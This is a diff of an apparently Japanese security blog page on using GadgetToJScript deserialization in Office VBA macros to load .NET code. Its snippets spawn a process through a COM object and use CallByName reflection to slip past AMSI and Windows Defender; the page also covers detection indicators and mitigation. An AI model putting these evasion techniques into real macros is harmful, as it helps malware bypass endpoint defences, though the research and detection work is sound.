 <h3 id="g2js--com-オブジェクトを利用した別プロセスの起動--enable-windows-defener">G2JS + COM オブジェクトを利用した別プロセスの起動  (Enable Windows Defener)</h3>
 <p>G2JS を使えばどんな .NET プログラムも実行することができますが、今回は VBA 単体だと AMSI + Windows Defender によって検知されてしまう、COM オブジェクトを使ったプロセス生成にチャレンジしてみます。</p>
 <p>下記の C# コードを用いて、G2JS でスクリプトを生成します。</p>
-<div class="highlight"><pre class="chroma"><code class="language-csharp" data-lang="csharp"><span class="p">(..</span><span class="n">snip</span><span class="p">..)</span>
-<span class="n">System</span><span class="p">.</span><span class="n">Type</span> <span class="n">com</span> <span class="p">=</span> <span class="n">Type</span><span class="p">.</span><span class="n">GetTypeFromCLSID</span><span class="p">(</span><span class="n">Guid</span><span class="p">.</span><span class="n">Parse</span><span class="p">(</span><span class="s">&#34;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#34;</span><span class="p">),</span> <span class="s">&#34;127.0.0.1&#34;</span><span class="p">);</span>
-<span class="kt">dynamic</span> <span class="n">obj</span> <span class="p">=</span> <span class="n">System</span><span class="p">.</span><span class="n">Activator</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">com</span><span class="p">);</span>
-<span class="n">obj</span><span class="p">.</span><span class="n">Item</span><span class="p">().</span><span class="n">Document</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">ShellExecute</span><span class="p">(</span><span class="s">&#34;notepad.exe&#34;</span><span class="p">,</span><span class="s">&#34;&#34;</span><span class="p">,</span><span class="s">&#34;&#34;</span><span class="p">,</span><span class="s">&#34;open&#34;</span><span class="p">,</span> <span class="m">1</span><span class="p">);</span>
-<span class="p">(..</span><span class="n">snip</span><span class="p">..)</span>
-</code></pre></div><p>ただし生成したスクリプトをそのまま動かすと Windows Defender によって検知されます。そこで独自にカスタマイズした難読化ツールで難読化し、実行してみます。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="p">(..</span><span class="n">snip</span><span class="p">..)</span>
+</span></span><span class="line"><span class="cl"><span class="n">System</span><span class="p">.</span><span class="n">Type</span> <span class="n">com</span> <span class="p">=</span> <span class="n">Type</span><span class="p">.</span><span class="n">GetTypeFromCLSID</span><span class="p">(</span><span class="n">Guid</span><span class="p">.</span><span class="n">Parse</span><span class="p">(</span><span class="s">&#34;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#34;</span><span class="p">),</span> <span class="s">&#34;127.0.0.1&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">dynamic</span> <span class="n">obj</span> <span class="p">=</span> <span class="n">System</span><span class="p">.</span><span class="n">Activator</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">com</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">obj</span><span class="p">.</span><span class="n">Item</span><span class="p">().</span><span class="n">Document</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">ShellExecute</span><span class="p">(</span><span class="s">&#34;notepad.exe&#34;</span><span class="p">,</span><span class="s">&#34;&#34;</span><span class="p">,</span><span class="s">&#34;&#34;</span><span class="p">,</span><span class="s">&#34;open&#34;</span><span class="p">,</span> <span class="m">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">(..</span><span class="n">snip</span><span class="p">..)</span>
+</span></span></code></pre></div><p>ただし生成したスクリプトをそのまま動かすと Windows Defender によって検知されます。そこで独自にカスタマイズした難読化ツールで難読化し、実行してみます。</p>
 <blockquote>
 <p>難読化ツールについては詳細を控えます。</p>
 </blockquote>
-<p><img src="images/g2js_com_evation.png" alt="g2js_com_evation"></p>
+<p><img src="images/g2js_com_evation.png" alt="g2js_com_evation" loading="lazy" /></p>
 <p>マクロを有効にすると、.NET プログラムが実行され、親プロセスが explorer.exe であるメモ帳が起動しました。Office プロセスのメモリ上に .NET プログラムが読み込まれていることが確認できます。</p>
 <p>以上のように Windows Defender および クラウド保護を有効にした状態、かつ Exploit Protection による子プロセス不許可が有効な状態であっても、全てをバイパスしてプロセスを生成することが可能です。</p>
 <h1 id="対策">対策</h1>
 <p>G2JS のデシリアライズ手法を用いて .NET プログラムを読み込むことで、Office プロセス内で VBA の領域を離れて侵害が可能であることを実証しました。</p>
 <p>この手法はあくまで VBA の仕様内で実現されるため、<strong>マクロを無効にする以外の有効な防止策はありません</strong>。</p>
 <p>なお COM オブジェクト経由で .NET を利用している関係上、VBA を動かしているプロセス(今回は EXCEL.EXE)は clr.dll が呼ばれます。これにより ProcessHacker でプロセスを確認すると .NET 関連のタブが表示されるようになりますが、そもそも VBA で .NET Framework を利用するシーンはたくさんあるため、これは何のインジケータにもなりません。</p>
-<p><img src="images/g2js_vba_excel_ph.png" alt="g2js_vba_excel_ph"></p>
+<p><img src="images/g2js_vba_excel_ph.png" alt="g2js_vba_excel_ph" loading="lazy" /></p>
 <h2 id="検知">検知</h2>
 <p>ただし G2JS にも弱点は存在します。それは、デシリアライズするために必須なメソッドが特徴的である点です。</p>
 <p>.NET プログラムをデシリアライズするために必須なコードは以下です。</p>
@@ -636,21 +637,21 @@ kernel32.RtlMoveMemory(,00000292c4ba3498,0000000000000001);
 </li>
 </ul>
 <p>これらのメソッド呼び出しは PowerShell のように簡単に難読化できるものではありません。そのため、文字列や変数名のみの簡易的な難読化であれば、以下のようにメソッド名が残ります。</p>
-<div class="highlight"><pre class="chroma"><code class="language-vb" data-lang="vb"><span class="n">pmfrxyltsrzjjj</span><span class="p">.</span><span class="n">ManifestText</span> <span class="o">=</span> <span class="n">djsktksnmbak</span>
-<span class="n">lzadypxlktswisq</span><span class="p">.</span><span class="n">WriteByte</span> <span class="n">i</span>
-<span class="k">Set</span> <span class="n">gmjxujigkjmudfmhkfzb</span> <span class="o">=</span> <span class="n">xaobbncueaofydar</span><span class="p">.</span><span class="n">Deserialize_2</span><span class="p">(</span><span class="n">lzadypxlktswisq</span><span class="p">)</span>
-</code></pre></div><p>単体で利用した場合にはともかく、1つの VBA 内でこれら 3 つが同時に利用されるパターンは .NET プログラムのデシリアライズを意図していると判断できるため、検知に有用と考えます。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-vb" data-lang="vb"><span class="line"><span class="cl"><span class="n">pmfrxyltsrzjjj</span><span class="p">.</span><span class="n">ManifestText</span> <span class="o">=</span> <span class="n">djsktksnmbak</span>
+</span></span><span class="line"><span class="cl"><span class="n">lzadypxlktswisq</span><span class="p">.</span><span class="n">WriteByte</span> <span class="n">i</span>
+</span></span><span class="line"><span class="cl"><span class="k">Set</span> <span class="n">gmjxujigkjmudfmhkfzb</span> <span class="o">=</span> <span class="n">xaobbncueaofydar</span><span class="p">.</span><span class="n">Deserialize_2</span><span class="p">(</span><span class="n">lzadypxlktswisq</span><span class="p">)</span>
+</span></span></code></pre></div><p>単体で利用した場合にはともかく、1つの VBA 内でこれら 3 つが同時に利用されるパターンは .NET プログラムのデシリアライズを意図していると判断できるため、検知に有用と考えます。</p>
 <p>また、Microsoft がこれらのメソッド名について AMSI トリガーを実装してしまえば、攻撃者側が以下のリフレクション手法を使っても動的解析で検知できる可能性が高いと考えられます。</p>
 <h3 id="リフレクションによる難読化について">リフレクションによる難読化について</h3>
 <p>VBA にも貧弱ながらリフレクションが存在し、より高度な難読化が可能です。 <a href="https://docs.microsoft.com/ja-jp/office/vba/language/reference/user-interface-help/callbyname-function">CallByName</a> です。例えば <code>fmt_1.Deserialize_2(stm_1)</code> についてはリフレクションを用いることで以下のように記載可能です。</p>
-<div class="highlight"><pre class="chroma"><code class="language-vb" data-lang="vb"><span class="k">Set</span> <span class="n">o1</span> <span class="o">=</span> <span class="n">CallByName</span><span class="p">(</span><span class="n">fmt_1</span><span class="p">,</span> <span class="s">&#34;Deserialize_2&#34;</span><span class="p">,</span> <span class="n">VbMethod</span><span class="p">,</span> <span class="n">stm_1</span><span class="p">)</span>
-</code></pre></div><p>このコードを文字列を別変数に代入し難読化すると、以下になります。</p>
-<div class="highlight"><pre class="chroma"><code class="language-vb" data-lang="vb"><span class="k">Set</span> <span class="n">cuzmicydpdcpnjnkcl</span> <span class="o">=</span> <span class="n">CallByName</span><span class="p">(</span><span class="n">ygftmlcabsflnu</span><span class="p">,</span> <span class="n">wsxfcgrolbfpixsfcosr</span><span class="p">,</span> <span class="n">idasmadwe</span><span class="p">,</span> <span class="n">htzojnmestlccsdkpcns</span><span class="p">)</span>
-</code></pre></div><p>このとおり、<code>Deserialize_2</code> の文字列がなくなりました。動的解析を行えば最終的に復元されますが、本メソッド名は現時点では AMSI トリガーに含まれないため AMSI プロバイダに渡されず、検知されません。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-vb" data-lang="vb"><span class="line"><span class="cl"><span class="k">Set</span> <span class="n">o1</span> <span class="o">=</span> <span class="n">CallByName</span><span class="p">(</span><span class="n">fmt_1</span><span class="p">,</span> <span class="s">&#34;Deserialize_2&#34;</span><span class="p">,</span> <span class="n">VbMethod</span><span class="p">,</span> <span class="n">stm_1</span><span class="p">)</span>
+</span></span></code></pre></div><p>このコードを文字列を別変数に代入し難読化すると、以下になります。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-vb" data-lang="vb"><span class="line"><span class="cl"><span class="k">Set</span> <span class="n">cuzmicydpdcpnjnkcl</span> <span class="o">=</span> <span class="n">CallByName</span><span class="p">(</span><span class="n">ygftmlcabsflnu</span><span class="p">,</span> <span class="n">wsxfcgrolbfpixsfcosr</span><span class="p">,</span> <span class="n">idasmadwe</span><span class="p">,</span> <span class="n">htzojnmestlccsdkpcns</span><span class="p">)</span>
+</span></span></code></pre></div><p>このとおり、<code>Deserialize_2</code> の文字列がなくなりました。動的解析を行えば最終的に復元されますが、本メソッド名は現時点では AMSI トリガーに含まれないため AMSI プロバイダに渡されず、検知されません。</p>
 <h4 id="callbyname-の悪性度">CallByName の悪性度</h4>
 <p>リフレクションを用いることで静的解析での検知は難しくなりました。ただしこの手法だと、リフレクション特有のメソッド <code>CallByName</code> がコード中に現れます。</p>
 <p><a href="https://jglobal.jst.go.jp/detail?JGLOBAL_ID=201802212058348458">三浦氏らの論文</a>によると、CallByName の悪性マクロでの出現率は 51.3% に対して、良性マクロでの出現率は 0.1% とされます。</p>
-<p><img src="images/benign_macro_point.png" alt="benign_macro_point"></p>
+<p><img src="images/benign_macro_point.png" alt="benign_macro_point" loading="lazy" /></p>
 <p>このことから、リフレクションによる難読化を使われてしまうとコードの静的解析による G2JS 特有の検知を行うことはできませんが、いくつかの検知手法と組み合わせることで汎用的に悪性マクロを検知できるものと考えます。</p>
 <h1 id="まとめ">まとめ</h1>
 <p>任意の .NET プログラムをデシリアライズして読み込む原理と、それを利用して Windows Script Host (WSH) 上で読み込む GadgetToJScript の実装を解説しました。</p>
@@ -800,13 +801,13 @@ kernel32.RtlMoveMemory(,00000292c4ba3498,0000000000000001);
 
 
 <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
-    
+
 <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js" integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut" crossorigin="anonymous"></script>
 
 <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
 
-<script src="/js/mediumish.js"></script>
 
+<script src="https://www.shutingrz.com/js/mediumish.e4b90c58dfa15ac82caf2edfa01e5fd047e17bc15e6babe5c0e442a4407d0b25.js" integrity="sha256-5LkMWN&#43;hWsgsry7foB5f0Efhe8Fea6vlwORCpEB9CyU="></script>
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
@@ -819,6 +820,5 @@ if (!doNotTrack) {
 	ga('send', 'pageview');
 }
 </script>
-
     </body>
 </html>
